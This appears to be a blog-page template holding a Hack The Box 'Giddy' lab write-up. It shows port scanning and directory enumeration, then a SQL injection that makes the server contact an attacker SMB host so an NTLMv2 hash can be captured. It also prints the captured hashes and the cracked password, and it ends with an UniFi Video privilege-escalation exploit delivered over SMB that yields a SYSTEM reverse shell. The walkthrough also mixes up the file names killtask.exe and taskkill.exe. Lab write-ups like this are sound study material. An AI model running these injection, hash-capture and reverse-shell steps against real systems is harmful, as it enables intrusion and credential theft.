@@ -1,0 +1,197 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Giddy</h1>
+    <p class="text">Difficulty : Medium | UserDifficulty : 5.5</p>
+
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV $IP --min-rate=10000</u>
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-title: IIS Windows Server
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
+| tls-alpn: 
+|   h2
+|_  http/1.1
+|_http-title: IIS Windows Server
+| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
+| Not valid before: 2018-06-16T21:28:55
+|_Not valid after:  2018-09-14T21:28:55
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_ssl-date: 2025-11-13T08:06:57+00:00; +6s from scanner time.
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2025-11-13T08:06:57+00:00; +6s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: GIDDY
+|   NetBIOS_Domain_Name: GIDDY
+|   NetBIOS_Computer_Name: GIDDY
+|   DNS_Domain_Name: Giddy
+|   DNS_Computer_Name: Giddy
+|   Product_Version: 10.0.14393
+|_  System_Time: 2025-11-13T08:06:53+00:00
+| ssl-cert: Subject: commonName=Giddy
+| Not valid before: 2025-11-12T07:59:29
+|_Not valid after:  2026-05-14T07:59:29
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0</code></pre></div>
+
+<p class="text">Https and HTTP are open on the target.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/giddy/1.png' %}" alt="">
+    <p class="text">There is only image. We have to enumerate. Also, https and http are serving the same web. Since it's often http is not well-function and the main target is https, i'll focus on https server.</p>
+</div>
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://$IP -k -t 70</u>
+===============================================================
+/aspnet_client        (Status: 301) [Size: 158] [--> http://10.129.96.140/aspnet_client/]
+/remote               (Status: 302) [Size: 157] [--> /Remote/default.aspx?ReturnUrl=%2fremote]
+
+===============================================================</code></pre></div>
+
+<p class="text">Since it aspnet.net, we need to enumerate extension aspx. Also, I oftem meet rare path in this context, we should use relatively large wordlist.</p>
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.129.96.140/ -k -x aspx -t 70 > https</u>
+└─$ cat https | grep -Ei '200|301'
+/<u>mvc</u>                  (Status: 301) [Size: 149] [--> https://10.129.96.140/mvc/]
+/200109*.aspx         (Status: 400) [Size: 3420]
+/200109*              (Status: 400) [Size: 3420]</code></pre></div>
+
+<p class="text">There is new folder mvc. It's worth visitting.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/giddy/2.png' %}" alt="">
+    <p class="text">I could open this folder. And there are several pages we can visit. Let's browse little bit.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/giddy/3.png' %}" alt="">
+    <p class="text">There is easily accessable URL parameter <u>ProductSubCategoryId</u>. It's worth testing SQL injection.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/giddy/4.png' %}" alt="">
+    <img src="{% static 'EthHack/images/giddy/5.png' %}" alt="">
+</div>
+
+<p class="text">Since the url parameter 1 or 1=1; -- - returns no error, we can conclude that the id parameter is unqupted string, and it's vulnerable to the SQL injection.</p>
+<p class="text">We can finish the query string and start another query string. Since the target running SQL on the machine, we may be able to get the SPN and it's NLTM v2 hash.</p>
+<p class="text">We could easily construct query string with curl command since it's GET request, and to receivce dirtree request, I'll use responder.</p>
+
+<div class="code-box"><pre><code>└─$ curl -k 'https://10.129.96.140/mvc/Product.aspx?ProductSubCategoryId=8;%20EXEC%20master..xp_dirtree%20%22\\10.10.16.38\test%22;%20--'
+ 
+
+└─$ sudo responder -I tun0 -v
+[sudo] password for kali: 
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.5.0
+[SMB] NTLMv2-SSP Client   : 10.129.96.140
+[SMB] NTLMv2-SSP Username : GIDDY\Stacy
+[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:9d2ee1b4bfc921ee:C6C39190EF32DE45A245051EB45C98EC:010100000000000000CB1FA65F54DC01555DF4273490174C0000000002000800450039005700360001001E00570049004E002D0030004A0049004A00390031003100340051004500540004003400570049004E002D0030004A0049004A0039003100310034005100450054002E0045003900570036002E004C004F00430041004C000300140045003900570036002E004C004F00430041004C000500140045003900570036002E004C004F00430041004C000700080000CB1FA65F54DC01060004000200000008003000300000000000000000000000003000002762417A769411BCA93BE69A4135470EE84D7142B6D1307AA641A58126FE96440A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E0033003800000000000000000000000000   </code></pre></div>
+
+<p class="text">It returned. We might be able to crack this hash.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/giddy]
+└─$ echo 'Stacy::GIDDY:c05e9fc36794939c:491552FB80A7AFA7CAECD03CC33A853A:010100000000000080C952935254DC01936EBE98355185C5000000000200080059004D005A00420001001E00570049004E002D003400510034003100370047004700550057004600330004003400570049004E002D00340051003400310037004700470055005700460033002E0059004D005A0042002E004C004F00430041004C000300140059004D005A0042002E004C004F00430041004C000500140059004D005A0042002E004C004F00430041004C000700080080C952935254DC01060004000200000008003000300000000000000000000000003000002762417A769411BCA93BE69A4135470EE84D7142B6D1307AA641A58126FE96440A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E0033003800000000000000000000000000' > hash2
+                                                                
+┌──(kali㉿kali)-[~/tempo/giddy]
+└─$ john hash2 --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 5 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<u>xNnWo6272k7x</u>     (Stacy)     
+1g 0:00:00:01 DONE (2025-11-13 04:06) 0.9523g/s 2562Kp/s 2562Kc/s 2562KC/s xabat..x343434x
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. </code></pre></div>
+
+<p class="text">Easy. We can login with this credential. Before we enumerated https server, we found /web relative path. </p>
+<div class="img">
+    <img src="{% static 'EthHack/images/giddy/6.png' %}" alt="">
+    <img src="{% static 'EthHack/images/giddy/7.png' %}" alt="">
+</div>
+
+<p class="text">We got web powershell interaction.</p>
+
+<h2 class="subtitle">PrivEsc</h2>
+<div class="code-box"><pre><code>PS C:\Users\Stacy\documents> 
+
+dir
+
+ 
+
+ 
+
+    Directory: C:\Users\Stacy\documents
+
+ 
+
+ 
+
+Mode                LastWriteTime         Length Name                                                                  
+
+----                -------------         ------ ----                                                                  
+
+-a----        10/7/2025  12:11 AM          45272 nc64.exe                                                              
+
+-a----        6/17/2018   9:36 AM              6 unifivideo                                                            
+
+ 
+
+ 
+
+PS C:\Users\Stacy\documents></code></pre></div>
+
+<p class="text">There is unifivideo. With simple keyword <u>unifivideo exploit</u>, I found <a href="https://github.com/CybermonkX/CVE-2016-6914-UniFiVideo-LPE">this</a> poc.</p>
+<p class="text">It says if we replace the killtask.exe located under the its application dir, we can execute arbitrary code.</p>
+<p class="text">Let's follow the instruction.</p>
+
+<div class="code-box"><pre><code>└─$ nano exploit.c <u class="green">Copy and paste the poc code...</u>
+
+└─$ x86_64-w64-mingw32-gcc exploit.c -o exploit.exe
+└─$ mv exploit.exe killtask.exe</code></pre></div>
+
+<p class="text">Then, we serve the file to the target machine with impacket-smbserver.</p>
+<div class="code-box"><pre><code>└─$ impacket-smbserver share . -smb2support -username a -password a</code></pre></div>
+
+<p class="text">On the target powershell...</p>
+<div class="code-box"><pre><code>PS C:\Users\Stacy\documents> net use \\10.10.16.38\share /user:a a
+PS C:\Users\Stacy\documents> copy \\10.10.16.38\share\taskkill.exe C:\ProgramData\unifi-video\taskkill.exe</code></pre></div>
+
+<p class="text">Prepare netcat to receive reverse shell...</p>
+<div class="code-box"><pre><code>└─$ nc -lvnp 4444</code></pre></div>
+
+<p class="text">Then, trigger the killtask.exe.</p>
+<div class="code-box"><pre><code>PS C:\Users\Stacy\documents> stop-service UnifiVideoService -Force</code></pre></div>
+
+<div class="code-box"><pre><code>└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.38] from (UNKNOWN) [10.129.96.140] 49853
+whoami
+nt authority\system</code></pre></div>
+
+<p class="text">Successfully the reverse shell code triggered.</p>
+<p class="text">It was easy.</p>
+
+└─$ 
+
+</body>
+</html>
